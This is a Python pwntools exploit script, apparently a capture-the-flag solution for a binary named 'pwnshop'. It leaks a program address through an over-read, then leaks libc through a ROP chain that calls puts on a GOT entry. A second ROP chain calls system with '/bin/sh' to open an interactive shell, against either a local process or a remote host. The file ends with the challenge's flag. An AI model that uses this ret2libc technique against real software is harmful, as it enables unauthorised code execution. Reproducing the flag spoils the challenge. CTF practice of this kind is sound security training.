from pwn import *
import time
import sys

context.log_level = 'debug'
def gstub():
    if (len(sys.argv) > 1 and sys.argv[1] == 'g'):
        gdb.attach(r)
        time.sleep(1)

g = gstub


LOCAL = True
if LOCAL:
    r = process('./pwnshop')
else:
    r = remote('94.237.63.201', 38311)

# get the leak
r.sendlineafter("> ", "2")
r.sendlineafter("? ", b"A" * 0x20 + b'C' * 0x8)
leak = r.recvline().split(b"CCCCCCC")[1].split(b" ")[0]
leak = int.from_bytes(leak[:-1], byteorder='little')

offset = 0x55986e1ad0c0 - 0x55986e1a9000
base = leak - offset 


print("leak: ", hex(leak))
print("offset: ", hex(offset))
print("base: ", hex(base))

# write a format string to the leaked buffer 
r.recvuntil("Exit\n> ")
l = r.sendlineafter("> ", "2")
l = r.sendlineafter("sell? ", "BBBBBBBB")
l = r.sendlineafter("it? ", b"13.37") # we have a leka actually 
r.sendlineafter(".\n", b"%s")

printf_got = base + 0x00004020
r.sendlineafter("\n> ", "1")
# yea can't really put a rop chain here...
pop_rdi = base + 0x00000000000013c3 
sub_rsp_x28 = base + 0x0000000000001219
pop_rbp = base + 0x0000000000001112 
print_caller = base + 0x1312
main = base + 0x000010a0
pop_rsp_13_14_15 = 0x00000000000013bd 
puts_plt = base + 0x00001030
buy = base + 0x0000132a
pop_rdi = base + 0x00000000000013c3 

# this one gets me back to pwnshop but something is corrupted so print fails?
# just call puts to leak the address 
payload = b'A' * 0x28
payload += p64(pop_rdi) #0x30 
payload += p64(printf_got)
payload += p64(puts_plt) # this gives a leak, after this go back up 0x38, current pos is 0x40
payload += p64(buy)
payload += p64(sub_rsp_x28)
assert len(payload) == 0x50
print("sent payload")
print("printf got: ", hex(printf_got))


r.sendafter(b"details: ", payload)
l = r.recvline()
libc_leak = int.from_bytes(l[:-1], byteorder='little')
libc_base = None
print("libc_leak: ", hex(libc_leak))
if LOCAL:
    libc_offset = 0x7fac8c20cc90 - 0x7fac8c1ab000
    libc_base = libc_leak - libc_offset
    system = libc_base + 0x52290
    binsh = libc_base + (0x7fa2306d55bd - 0x7fa230521000)
else:
    libc_base = libc_leak - 0x55810
    system = libc_base + 0x453a0
    binsh = libc_base + 0x18ce17

""" g() """

print("system: ", hex(system))
print("libc base: ", hex(libc_base))
""" r.sendlineafter(b"\n> ", "1") """
payload = b'A' * 0x28
payload += p64(pop_rdi) #0x30 
payload += p64(binsh)
payload += p64(system) # this gives a leak, after this go back up 0x38, current pos is 0x40
payload += p64(0)
payload += p64(sub_rsp_x28)
""" assert len(payload) == 0x50 """
r.sendafter("details: ", payload)
r.interactive()


    

# need to get back to the stack somehow?
 
# probs need to get a libc leak 
# not sure how to put libc onto the stack so that i can get executed

r.interactive()
# HTB{th1s_is_wh@t_I_c@ll_a_g00d_d3a1!}

